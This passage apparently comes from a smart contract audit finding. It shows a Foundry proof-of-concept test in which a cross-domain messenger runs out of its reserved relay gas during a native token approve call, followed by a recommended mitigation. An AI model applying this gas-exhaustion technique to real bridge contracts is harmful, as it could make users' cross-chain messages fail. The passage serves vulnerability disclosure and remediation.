            emit RelayedMessage(versionedHash);
        } else {
            failedMessages[versionedHash] = true;
            emit FailedRelayedMessage(versionedHash);
        }
    }
}

contract POC is Test {
    using stdStorage for StdStorage;

    DummyCrossDomainMessenger xdm;
    L2NativeToken token;

    function setUp() public {
        token = L2NativeToken(address(new DummyToken()));
        xdm = new DummyCrossDomainMessenger(address(token));
    }

    function testZach_insufficientRelayReservedGas() public {
        address to = makeAddr("to");

        // set up token approval to spoof situation before the external call
        vm.startPrank(address(xdm));
        for (uint i = 1; i < 10; i++) {
            token.approve(address(uint160(i)), 1);
        }
        token.approve(to, 1);
        vm.stopPrank();

        // the external call can leave us with as little as `RELAY_RESERVED_GAS` left
        // so we'll emulate this by starting the logic there and passing `RELAY_RESERVED_GAS`
        xdm.relayMessage{gas: 40_000}(to, 1, true);
    }
}
```

### Mitigation

Increase the `RELAY_RESERVED_GAS` value to account for the additional gas usage in the `nativeToken.approve()` call. Additionally, ensure there is a strict requirement on native tokens that they cannot in any case use more gas than expected for this call.


